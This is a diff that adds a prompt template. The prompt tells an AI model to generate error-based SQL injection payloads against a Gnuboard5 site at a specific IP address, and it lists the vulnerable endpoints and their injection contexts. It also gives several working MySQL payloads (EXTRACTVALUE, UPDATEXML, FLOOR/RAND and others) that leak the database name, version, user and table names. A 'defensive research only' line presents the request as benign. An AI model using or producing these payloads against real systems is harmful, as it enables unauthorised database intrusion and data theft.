@@ -1,0 +1,51 @@
+You are a cybersecurity expert specializing in web application attacks.
+Generate security test payloads for defensive research purposes only.
+Output only the required lines in the exact format specified.
+No explanations, no headings, no numbering, no bullet points, no blank lines.
+
+---
+
+Target: Gnuboard5 (Apache + PHP + MySQL)
+Base URL: http://34.68.27.120:8081/
+
+Endpoint examples:
+  GET  /bbs/search.php          ?stx=[PAYLOAD]   (LIKE '%input%' context)
+  GET  /bbs/search.php          ?sfl=[PAYLOAD]   (WHERE {field} context)
+  POST /bbs/login_check.php     mb_id=[PAYLOAD]  (WHERE mb_id='input' context)
+
+Injection context: String or identifier position in MySQL query.
+The injected value is placed inside a SQL query without parameterization.
+Gnuboard5 may apply addslashes() — test both escaped and unescaped variants.
+
+Goal: Force MySQL to return a visible error message that leaks internal data
+(database name, version, user, table names, column values).
+
+Attack techniques:
+1. EXTRACTVALUE — triggers XPath error with injected string:
+   ' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -
+   ' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -
+   ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)))-- -
+
+2. UPDATEXML — similar to EXTRACTVALUE but different syntax:
+   ' AND UPDATEXML(1,CONCAT(0x7e,database()),1)-- -
+   ' AND UPDATEXML(1,CONCAT(0x7e,user()),1)-- -
+
+3. FLOOR + RAND + GROUP BY — classic MySQL error:
+   ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+
+4. Geometry error (MySQL < 5.7.5):
+   ' AND GeometryCollection((SELECT * FROM (SELECT * FROM (SELECT database())a)b))-- -
+
+5. NAME_CONST error (older MySQL):
+   ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)-- -
+
+Generate 8 Error-based SQL injection payloads targeting Gnuboard5 MySQL.
+Cover at least: EXTRACTVALUE (version, database, table), UPDATEXML (user, database), FLOOR+RAND.
+
+Output format (one line per payload, no other text):
+TYPE | PATTERN_FAMILY | PAYLOAD
+
+Example:
+ERROR_BASED | extractvalue_version | ' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -
+ERROR_BASED | updatexml_database | ' AND UPDATEXML(1,CONCAT(0x7e,database()),1)-- -
+ERROR_BASED | floor_rand_db | ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
